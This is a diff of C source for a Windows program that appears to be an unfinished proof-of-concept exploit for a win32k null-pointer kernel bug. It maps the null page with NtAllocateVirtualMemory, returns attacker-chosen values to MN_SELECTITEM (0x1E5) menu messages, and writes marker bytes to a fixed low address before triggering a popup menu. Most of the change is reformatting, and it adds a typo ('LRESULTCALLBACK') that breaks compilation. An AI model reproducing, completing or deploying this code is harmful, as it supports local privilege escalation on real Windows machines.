@@ -20,58 +20,60 @@ NTSTATUS
 
 void AllocNullPage() 
 {
-	HMODULE h;
-	HANDLE hProc;
-	PVOID addr;
-	ULONG size;
-	NTSTATUS st;
+HMODULE h;
+HANDLE hProc;
+PVOID addr;
+ULONG size;
+NTSTATUS st;
 
-	size = 4096;
-	addr = (PVOID)1;
-	h = LoadLibraryA("ntdll.dll");
+size = 4096;
+addr = (PVOID)1;
+h = LoadLibraryA("ntdll.dll");
 
-	if (!h) {
-		
-		exit(1);
-	}
-	NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
+if (!h)
+{
+	
+	exit(1);
+}
+NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
 
-	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(h, "NtAllocateVirtualMemory");
+NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(h, "NtAllocateVirtualMemory");
 
-	if (!NtAllocateVirtualMemory) {
-		exit(1);
-	}
-
-	hProc = GetCurrentProcess();
-
-	if (!hProc) {
-		exit(1);
-	}
-
-	st = NtAllocateVirtualMemory(hProc, &addr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-	if (!NT_SUCCESS(st)) {
-		exit(1);
-	}
+if (!NtAllocateVirtualMemory) 
+{
+	exit(1);
 }
 
+hProc = GetCurrentProcess();
 
-	LRESULT CALLBACK MyWndProc (HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) 
+if (!hProc)
+{
+	exit(1);
+}
+
+st = NtAllocateVirtualMemory(hProc, &addr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+if (!NT_SUCCESS(st))
+{
+	exit(1);
+}
+}
+
+LRESULTCALLBACK MyWndProc (HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) 
 { 
-	if (Msg == 0x1E5) // MN_SELECTITEM 
-	{ 
+if (Msg == 0x1E5) // MN_SELECTITEM 
+{ 
 	// control return value 
-		return 0x10; 
-	} 
-	return DefWindowProc (hWnd, Msg, wParam, lParam); 
+	return 0x10; 
+} 
+return DefWindowProc (hWnd, Msg, wParam, lParam); 
 }
 
     //===================================================================================
     //ShowPopupMenu
     //===================================================================================
-    BOOL ShowPopupMenu( HWND hWnd, POINT *curpos, int wDefaultItem ) 
-	{
-   
+ BOOL ShowPopupMenu( HWND hWnd, POINT *curpos, int wDefaultItem ) 
+ {
    
       //ADD MENU ITEMS.------------------------------------------------------------------
       HMENU hPop = CreatePopupMenu();
@@ -93,17 +95,16 @@ void AllocNullPage()
         curpos = &pt;
      }
    
-	//if(!SetWindowLong((HWND)hPop, GWL_WNDPROC, (LONG)MyWndProc))
-	//{
-	//	//DebugBreak();
-	//}
-		//DISPLAT MENU AND WAIT FOR SELECTION.-----------------------------------------
+    //if(!SetWindowLong((HWND)hPop, GWL_WNDPROC, (LONG)MyWndProc))
+    //{
+    //	//DebugBreak();
+    //}
+    	//DISPLAT MENU AND WAIT FOR SELECTION.-----------------------------------------
 
-	//AllocNullPage();
-	memset((void*)0x00010003,'\x41',8);
-
-	WORD cmd = TrackPopupMenu( hPop, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD | TPM_NONOTIFY, curpos->x, curpos->y, 0, hWnd, NULL );
-		
+    //AllocNullPage();
+    memset((void*)0x00010003,'\x41',8);
+    WORD cmd = TrackPopupMenu( hPop, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD | TPM_NONOTIFY, curpos->x, curpos->y, 0, hWnd, NULL );
+    	
 		//SEND MESSAGE MAPPED TO SELECTED ITEM.----------------------------------------
 	
 	
@@ -111,72 +112,56 @@ void AllocNullPage()
    
  //   DestroyMenu(hPop);
 //return 0;
-    }
-   
-
-   
+	}
     //===================================================================================
     //WndProc
     //===================================================================================
-    static LRESULT CALLBACK WndProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam ) 
-	{ 
-   
-		if(0x1E5==uMsg)
-		{
+static LRESULT CALLBACK WndProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam ) 
+{ 
+  if(0x1E5==uMsg)
+	{
 			//DebugBreak();
-			return 10;
-		}
-   
+	return 10;
+	}
       return DefWindowProc( hWnd, uMsg, wParam, lParam );
-   
     }
    
-
-
-
-
-    int WINAPI WinMain( HINSTANCE hInst, HINSTANCE prev, LPSTR cmdline, int show ) 
-	{
-       
-      {
+ int WINAPI WinMain( HINSTANCE hInst, HINSTANCE prev, LPSTR cmdline, int show ) 
+ {
         //CHECK IF PREVIOUS ISTANCE IS RUNNING.-----------------------------------------------------
         HWND hPrev = NULL;
         if ( hPrev = FindWindow( THIS_CLASSNAME, TEXT("Title") ) ) {
-          MessageBox(NULL, TEXT("Previous instance alredy running!"), TEXT("Warning"), MB_OK );
-          return 0;
-        }
-      }
+        MessageBox(NULL, TEXT("Previous instance alredy running!"), TEXT("Warning"), MB_OK );
+       	return 0;
+}
         
-      {
-        //REGISTER WINDOW.--------------------------------------------------------------------------
-        WNDCLASSEX wclx; 
-        memset(&wclx, 0, sizeof(wclx));
+   //REGISTER WINDOW.--------------------------------------------------------------------------
+   WNDCLASSEX wclx; 
+   memset(&wclx, 0, sizeof(wclx));
    
-        wclx.cbSize         = sizeof( wclx );
-        wclx.style          = 0;
-        wclx.lpfnWndProc    = &WndProc;
-        wclx.cbClsExtra     = 0;
-        wclx.cbWndExtra     = 0;
-        wclx.hInstance      = hInst;
-        //wclx.hIcon        = LoadIcon( hInstance, MAKEINTRESOURCE( IDI_TRAYICON ) );
-        //wclx.hIconSm      = LoadSmallIcon( hInstance, IDI_TRAYICON );
-        wclx.hCursor        = LoadCursor( NULL, IDC_ARROW );
-        wclx.hbrBackground  = (HBRUSH)( COLOR_BTNFACE + 1 );   
-                                                                
-        wclx.lpszMenuName   = NULL;
-        wclx.lpszClassName  = THIS_CLASSNAME;
+   wclx.cbSize         = sizeof( wclx );
+   wclx.style          = 0;
+   wclx.lpfnWndProc    = &WndProc;
+   wclx.cbClsExtra     = 0;
+   wclx.cbWndExtra     = 0;
+   wclx.hInstance      = hInst;
+   //wclx.hIcon        = LoadIcon( hInstance, MAKEINTRESOURCE( IDI_TRAYICON ) );
+   //wclx.hIconSm      = LoadSmallIcon( hInstance, IDI_TRAYICON );
+   wclx.hCursor        = LoadCursor( NULL, IDC_ARROW );
+   wclx.hbrBackground  = (HBRUSH)( COLOR_BTNFACE + 1 );   
+                                                           
+   wclx.lpszMenuName   = NULL;
+   wclx.lpszClassName  = THIS_CLASSNAME;
    
-        RegisterClassEx( &wclx );
-      }
-      
-      
-        //CREATE WINDOW.----------------------------------------------------------------------------
-        HWND hWnd = CreateWindow( THIS_CLASSNAME, TEXT("Title"), WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 250, 150, NULL, NULL, hInst, NULL );
-        if ( !hWnd ) {
-          MessageBox(NULL, "Can't create window!", TEXT("Warning!"), MB_ICONERROR | MB_OK | MB_TOPMOST);
-          return 1;
-        }
-      
-		  ShowPopupMenu(hWnd, NULL, -1 );
+   RegisterClassEx( &wclx );
+
+  //CREATE WINDOW.----------------------------------------------------------------------------
+  HWND hWnd = CreateWindow( THIS_CLASSNAME, TEXT("Title"), WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 250, 150, NULL, NULL, hInst, NULL );
+  if ( !hWnd ) 
+  {
+        MessageBox(NULL, "Can't create window!", TEXT("Warning!"), MB_ICONERROR | MB_OK | MB_TOPMOST);
+        return 1;
+   }
+  ShowPopupMenu(hWnd, NULL, -1 );
    
-    }
+}
